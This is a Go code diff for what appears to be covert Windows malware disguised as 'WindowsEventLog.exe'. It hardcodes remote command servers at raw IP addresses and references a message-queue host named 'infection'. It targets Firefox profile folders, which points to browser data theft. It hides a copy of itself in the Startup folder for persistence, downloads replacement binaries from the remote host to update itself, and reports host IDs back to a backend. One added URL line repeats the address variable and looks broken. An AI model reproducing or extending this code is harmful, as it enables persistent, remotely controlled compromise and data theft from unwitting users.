@@ -28,7 +28,7 @@ import (
 
 const VERSION string = "5"
 const MIDURL string = "http://111.231.82.173/"
-const MIDFILE string = "http://111.231.82.173/file/"
+const MIDFILE string = "http://47.95.233.176/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
 const MIDETCD string = "111.231.82.173:2379"
 const MIDKILLIP string = "http://111.231.82.173:9000/Killip"
@@ -39,17 +39,29 @@ const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
 const CURRENTPATH = "C:\\Windows\\Temp\\"
 const NOGUILOG = "C:\\Windows\\Temp\\nogui.txt"
 
+const TMVC = ":6000"
+const PMVC = ":5002"
+
+const TMQ = ":6006"
+const PMQ = ":5006"
+
+const MQHOST = "infection"
+
+var NEWPATH = get_current_user() + "\\microsoftNet\\"
+var DATAPATH = get_current_user() + "\\temp\\"
 var HOSTID = machineinfo.GetSystemVersion().Hostid
 var BrowserSafepath = get_current_user() + "\\tmp\\"
 var Firefox = get_current_user() + "\\fire\\"
-var Firefoxpath = get_current_user() + "\\appdata\\Roaming\\Mozilla\\Firefox\\Profiles"
+var Firefoxpath = get_current_user() + "\\appdata\\Roaming\\Mozilla\\Firefox\\Profiles\\"
 var AUTOSTART = get_current_user() + "\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 
 //var OUTIP string
 
 type Msg struct {
-	Hostid string `json:"hostid"`
-	Code   int    `json:"code"`
+	Hostid      string `json:"hostid"`
+	Code        int    `json:"code"`
+	Softversion string `json:"softversion"`
+	Type        string `json:"type"`
 }
 
 // get out ip
@@ -57,7 +69,7 @@ func GetOutIp() string {
 	// nil kill process
 	body, err := ioutil.ReadFile(CURRENTPATH + "ip.txt")
 	if err != nil {
-		log.Panic(err)
+		log.Println(err)
 		return "none"
 	}
 	return strings.TrimSpace(string(body))
@@ -66,7 +78,7 @@ func GetOutIp() string {
 func get_current_user() string {
 	usr, err := user.Current()
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	return usr.HomeDir
 }
@@ -76,28 +88,29 @@ func RandInt64(min, max int64) int {
 }
 
 //ioop check version update
-func DoUpdate() {
-	for {
-		ticker := time.NewTicker(time.Second * time.Duration(RandInt64(35, 180)))
-		resp, err := http.Get(MIDFILE + "noguiversion.txt")
-		if err != nil {
-			log.Println(err)
-		}
-		body, _ := ioutil.ReadAll(resp.Body)
-		defer resp.Body.Close()
-		current_file := strings.Split(os.Args[0], "\\")
-		frpe, err := http.Get(MIDFILE + current_file[len(current_file)-1])
-		if strings.TrimSpace(string(body)) != VERSION {
-			err = update.Apply(frpe.Body, update.Options{TargetPath: os.Args[0]})
-			if err != nil {
-				// error handling
-			}
-			time.Sleep(2 * time.Second)
-			// when update done shlb be kill main process
-			KillMain()
-		}
-		<-ticker.C
+func DoUpdate(addr string, backendAddr string) {
+	//for {
+	//ticker := time.NewTicker(time.Second * time.Duration(RandInt64(35, 180)))
+	//resp, err := http.Get(MIDFILE + "noguiversion.txt")
+	//if err != nil {
+	//	log.Println(err)
+	//}
+	//body, _ := ioutil.ReadAll(resp.Body)
+	//defer resp.Body.Close()
+	current_file := strings.Split(os.Args[0], "\\")
+	frpe, err := http.Get(MIDFILE + current_file[len(current_file)-1])
+	//if strings.TrimSpace(string(body)) != VERSION {
+	err = update.Apply(frpe.Body, update.Options{TargetPath: os.Args[0]})
+	if err != nil {
+		EventStatusCode(301, HOSTID, VERSION, "1", "http://"+addr+backendAddr+"/browser/Event")
 	}
+	EventStatusCode(102, HOSTID, VERSION, "1", "http://"+addr+backendAddr+"/browser/Event")
+	time.Sleep(2 * time.Second)
+	// when update done shlb be kill main process
+	KillMain()
+	//}
+	//<-ticker.C
+	//}
 }
 
 func ClearPic() {
@@ -182,10 +195,12 @@ func KillMain() {
 }
 func AutoStart() {
 	time.Sleep(6 * time.Second)
-	move := exec.Command("cmd", "/C", "copy", CURRENTPATH+"WindowsEventLog.exe", AUTOSTART+"WindowsEventLog.exe")
-	move.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	// not Start will continue
-	move.Run()
+	if FileExits(AUTOSTART+"WindowsEventLog.exe") != nil {
+		move := exec.Command("cmd", "/C", "copy", "/s", "/q", CURRENTPATH+"WindowsEventLog.exe", AUTOSTART+"WindowsEventLog.exe")
+		move.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		// not Start will continue
+		move.Run()
+	}
 }
 func MultiFileDown(files []string, step string) {
 	if len(files) == 0 && step == "init" {
@@ -205,8 +220,10 @@ func MultiFileDown(files []string, step string) {
 func Get(url string, file string) {
 	resp, err := http.Get(url)
 	if err != nil {
+		log.Println("下载失败:", file)
 		return
 	}
+	log.Println("下载成功:", file)
 	body, _ := ioutil.ReadAll(resp.Body)
 	ioutil.WriteFile(CURRENTPATH+file, body, 0644)
 }
@@ -231,7 +248,7 @@ func CheckInlib(addr string) error {
 		Hostid: HOSTID,
 	}
 	resp, body, _ := gorequest.New().
-		Post("http://" + addr + ":5002/machine/machineCheck").
+		Post("http://" + addr + addr + "/machine/machineCheck").
 		//Set("content-type", "application/x-www-form-urlencoded").
 		Send(msg).
 		End()
@@ -256,11 +273,14 @@ func FileExits(path string) error {
 	return nil
 }
 
-func ErrorStatusCode(code int, hostid string, addr string) {
+func EventStatusCode(code int, hostid string, softversion string, typ string, addr string) {
 	msg := Msg{
-		Hostid: hostid,
-		Code:   code,
+		Hostid:      hostid,
+		Code:        code,
+		Type:        typ,
+		Softversion: softversion,
 	}
+	log.Println(msg)
 	_, _, _ = gorequest.New().
 		Post(addr).
 		Set("content-type", "application/x-www-form-urlencoded").
